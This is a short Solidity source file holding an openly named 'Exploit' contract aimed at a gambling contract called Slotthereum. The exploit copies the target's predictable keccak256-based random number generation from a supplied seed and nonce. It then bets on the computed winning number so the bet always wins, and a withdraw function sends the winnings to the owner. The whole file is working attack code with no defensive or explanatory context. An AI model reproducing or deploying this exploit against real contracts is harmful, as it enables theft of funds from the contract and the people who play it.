// 109999999999999999 * 10 / 9 = x

contract Slotthereum {
    function placeBet(uint8 start, uint8 end) public payable returns (bool) {
    }
}

contract Exploit {
    address owner;
    Slotthereum target;
    bytes32 seed;
    uint nonce;
    
    function Exploit() {
        owner = msg.sender;
    }
    
    function attack(address a, bytes32 s, uint n) payable {
        Slotthereum target = Slotthereum(a);
        seed = s;
        nonce = n;
        uint8 win = getNumber();
        target.placeBet.value(msg.value)(win, win);
    }
    
    function () payable {
        
    }
    
    function withdraw() {
        require(msg.sender == owner);
        msg.sender.transfer(this.balance);
    }
    
    function random(uint8 min, uint8 max) public returns (uint) {
        nonce++;
        return uint(keccak256(nonce, seed))%(min+max)-min;
    }

    function random8(uint8 min, uint8 max) public returns (uint8) {
        nonce++;
        return uint8(keccak256(nonce, seed))%(min+max)-min;
    }

    function newSeed() public {
        seed = keccak256(nonce, seed, random(0, 255));
    }

    function getNumber() public returns (uint8) {
        newSeed();
        return random8(0,9);
    }
}